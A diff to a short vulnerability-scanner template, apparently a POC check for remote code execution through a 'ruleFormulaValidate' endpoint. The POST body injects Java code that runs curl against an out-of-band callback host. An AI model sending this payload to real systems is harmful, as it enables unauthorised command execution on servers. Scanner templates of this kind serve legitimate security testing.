@@ -14,8 +14,6 @@ info:
   created: 2025/1/16
 
 set:
-  oob: oob()
-  oobHTTP: oob.HTTP
   hostname: request.url.host
 
 rules:
@@ -48,7 +46,7 @@ rules:
       headers:
         Content-Type: application/x-www-form-urlencoded
       body: |
-        s_bean=ruleFormulaValidate&script=try {String cmd = "curl+{{oobHTTP}}";Process child = Runtime.getRuntime().exec(cmd);} catch (IOException e) {System.err.println(e);}
-    expression: response.status == 200 && oobCheck(oob, oob.ProtocolHTTP, 3)
+        s_bean=ruleFormulaValidate&script=try {String cmd = "curl+{{oob.HTTP}}";Process child = Runtime.getRuntime().exec(cmd);} catch (IOException e) {System.err.println(e);}
+    expression: response.status == 200 && oobCheck(oob.ProtocolHTTP, 3)
 
 expression: r0() && r1()
